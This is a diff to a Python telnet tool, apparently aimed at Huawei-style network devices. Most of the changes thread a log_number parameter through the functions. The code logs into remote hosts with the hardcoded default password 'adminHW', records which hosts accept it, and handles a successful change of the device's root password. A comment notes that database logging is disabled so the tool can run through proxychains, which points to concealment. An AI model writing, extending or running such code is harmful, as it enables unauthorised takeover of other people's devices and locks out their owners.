@@ -31,7 +31,7 @@ password = b'adminHW\r\n'
 global_error = False
 
 # Return a socket with the telnet session
-def telnet_auth_sequence(remote_host, remote_port, credentials_path, log_output=None, max_retries=5, detail=True):
+def telnet_auth_sequence(log_number, remote_host, remote_port, credentials_path, log_output=None, max_retries=5, detail=True):
 
     global global_error
     global auth_timeout
@@ -85,7 +85,7 @@ def telnet_auth_sequence(remote_host, remote_port, credentials_path, log_output=
 
     if remote_socket:
         # Receive response
-        response = socket_send_sequence(remote_host, remote_socket, login_sequence, auth_timeout, True, log_output)
+        response = socket_send_sequence(log_number, remote_host, remote_socket, login_sequence, auth_timeout, True, log_output)
     else:
         print(Colors.RED + "[!] Remote socket not created!" + Colors.R)
         return
@@ -99,16 +99,18 @@ def telnet_auth_sequence(remote_host, remote_port, credentials_path, log_output=
 
     #if "Last login" in response:
     if "Password is default value" in response:
-        login_data = [remote_host, elapsed_time, datetime.now(), True]
-        login_log(login_data)   # Data is logged into a csv file and database
+        login_data = [remote_host, elapsed_time, datetime.now(), True, password]
+        #login_log(login_data, log_number, True)   # Data is logged into a csv file and database
+        login_log(login_data, log_number, False)   # Data is logged into a csv file but not in database (to use proxychains)
 
         if detail:
             print(Colors.GREEN + f"[!] Successful Telnet Session to [{remote_host}:{remote_port}]" + Colors.R)
             print(Colors.GREEN + "---------------------------------------------------------------------" + Colors.R)
         global_error = False
     else:
-        login_data = [remote_host, elapsed_time, datetime.now(), False ]
-        login_log(login_data)   # Data is logged into a csv file and database
+        login_data = [remote_host, elapsed_time, datetime.now(), False, password]
+        #login_log(login_data, log_number)   # Data is logged into a csv file and database
+        login_log(login_data, log_number, False)   # Data is logged into a csv file but not in database (to use proxychains)
 
         if detail:
             print(Colors.RED + f"[x] Failed Telnet Session to [{remote_host}:{remote_port}]\n" + Colors.R)
@@ -153,7 +155,7 @@ def socket_receive_all(remote_socket, byte_size=4096, end_marker=b"WAP>", timeou
     return buffer
 
 
-def socket_send_data(remote_ip, remote_socket, command, timeout=5, detail=False, max_retries=5):
+def socket_send_data(log_number, remote_ip, remote_socket, command, timeout=5, detail=False, max_retries=5):
     global global_error
 
     if remote_socket is None or remote_socket.fileno() == -1:
@@ -193,7 +195,7 @@ def socket_send_data(remote_ip, remote_socket, command, timeout=5, detail=False,
         },
         "EGflFhmzQUnTc8gJlku/": {
             "expected_pattern": b"Password of root has been modified successfully",
-            "handler": lambda response: update_telnet_pass(response, remote_ip, 'changed_telnet_pass.csv')
+            "handler": lambda response: update_telnet_pass(response, remote_ip, log_number)
         },
     }
 
@@ -230,7 +232,7 @@ def socket_send_data(remote_ip, remote_socket, command, timeout=5, detail=False,
 
 # For sending list of commands. It is possible to save the output log
 # timeout works for each command in the provided commands list
-def socket_send_sequence(remote_host, remote_socket, commands, timeout=1, detail=True, log_output=None, delay=2):
+def socket_send_sequence(log_number, remote_host, remote_socket, commands, timeout=1, detail=True, log_output=None, delay=2):
     global global_error
 
     response = b''
@@ -246,7 +248,7 @@ def socket_send_sequence(remote_host, remote_socket, commands, timeout=1, detail
 
         # Send the data to remote socket
         if global_error is False:
-            response += socket_send_data(remote_host, remote_socket, command, timeout, detail)
+            response += socket_send_data(log_number, remote_host, remote_socket, command, timeout, detail)
 
         time.sleep(delay)
         cont += 1
